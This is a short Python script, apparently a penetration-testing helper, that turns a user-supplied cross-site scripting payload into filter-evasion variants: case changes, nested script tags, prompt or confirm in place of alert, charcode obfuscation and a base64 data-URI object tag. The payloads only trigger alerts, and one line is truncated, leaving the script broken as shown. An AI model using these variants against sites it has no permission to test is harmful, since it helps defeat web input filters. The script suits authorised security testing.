#!/usr/bin/python3 
import sys

#Author: Dan Cannon
#Company: North Green Security
#Note: I am far from a coder so do not judge any inefficiencies in the code :-) 

s = input("What Payload do you want to modify?")
#s = str(sys.argv[1])
payloads=[]

keywords = ["script", "src", "img", "audio", "video", "onerror", "alert"]

for keyword in keywords:
    payloads.append(s.replace(keyword, keyword.upper()))
    payloads.append(s.replace(keyword, keyword.lower()))
    if keyword == "script":
        payloads.append(s.replace(keyword, "scr<script>ipt"))
    if keyword == "alert":
        payloads.append(s.replace(keyword, "prompt"))
        payloads.append(s.replace(keyword, "confirm"))
    if keyword in ["img", "audio", "video"]:
        payloads.append(s.replace(keyword, "ImG"))
        payloads.append(s.replace(keyword, "AuDiO"))
        payloads.append(s.replace(keyword, "ViDeO"))

payloads.append(s.replace("alert(1)", "alert(\"NGS XSS\")"))
payloads.append(s.replace("alert(1)", "eval(String.fromCharCode(97,108,101,114,116,40,34,78,71,83,32,88,83,34,41))"))
payloads.append(s.replace("<script>alert(1)</script>", "<html ontouchstart=alert(1)>"))
payloads.append(s.replace("<script>alert(1)</script>", "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></o>

## sort by unique ##
unique = sorted(set(payloads))


print("\n".join(unique))
print("\n")
#comment out the below if you do not want to have recommended test payloads output to the terminal
print("You could also try the following benign payloads and observe the output")
print("<h1>test</h1>")
print("\"><h1>test</h1>")
print("<b>test</b>")
print("\"><b>test</b>")

